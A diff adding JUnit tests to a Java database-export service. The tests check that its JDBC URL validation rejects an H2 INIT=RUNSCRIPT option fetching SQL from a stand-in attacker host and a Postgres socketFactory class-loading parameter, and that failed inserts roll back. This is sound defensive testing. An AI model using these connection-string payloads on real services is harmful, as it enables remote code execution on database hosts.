@@ -63,6 +63,54 @@ class DatabaseExportServiceTest {
     }
 
     @Test
+    void rejectsJdbcUrlOptionsThatCanRunCode() {
+        // H2 runs INIT at connect time, so this option is an SQL/RCE hook.
+        assertThatThrownBy(() -> service.export(TABLE, request(
+                "jdbc:h2:mem:evil;INIT=RUNSCRIPT_FROM('http://attacker/x.sql')", "People")))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessageContaining("'INIT' is not allowed");
+    }
+
+    @Test
+    void rejectsJdbcUrlWithWhitespace() {
+        assertThatThrownBy(() -> service.export(TABLE, request(
+                "jdbc:h2:mem:evil2;INIT=RUNSCRIPT FROM 'http://attacker/x.sql'", "People")))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessageContaining("whitespace");
+    }
+
+    @Test
+    void rejectsPostgresQueryParametersThatLoadClasses() {
+        assertThatThrownBy(() -> service.export(TABLE, request(
+                "jdbc:postgresql://db/app?socketFactory=org.evil.Factory", "People")))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessageContaining("'SOCKETFACTORY' is not allowed");
+    }
+
+    @Test
+    void allowsCommonPostgresConnectionParameters() {
+        // Rejected at connect time (no such host), not by URL validation.
+        assertThatThrownBy(() -> service.export(TABLE, request(
+                "jdbc:postgresql://127.0.0.1:1/app?sslmode=require&connectTimeout=1", "People")))
+                .isNotInstanceOf(IllegalArgumentException.class);
+    }
+
+    @Test
+    void failedInsertLeavesNoPartialRowsBehind() {
+        String url = "jdbc:h2:mem:dbexportrollback;DB_CLOSE_DELAY=-1";
+        JdbcTemplate jdbc = new JdbcTemplate(new SimpleDriverDataSource(
+                new org.h2.Driver(), url, "sa", ""));
+        // "Grace" does not fit, so the second row of the batch fails.
+        jdbc.execute("CREATE TABLE \"People\" (\"FirstName\" VARCHAR(3), \"City\" VARCHAR(50))");
+
+        assertThatThrownBy(() -> service.export(TABLE, request(url, "People")))
+                .isInstanceOf(RuntimeException.class);
+
+        Integer count = jdbc.queryForObject("SELECT COUNT(*) FROM \"People\"", Integer.class);
+        assertThat(count).isZero();
+    }
+
+    @Test
     void rejectsEmptyTable() {
         assertThatThrownBy(() -> service.export(new TableData(List.of(), List.of()),
                 request("jdbc:h2:mem:dbexport3", "People")))
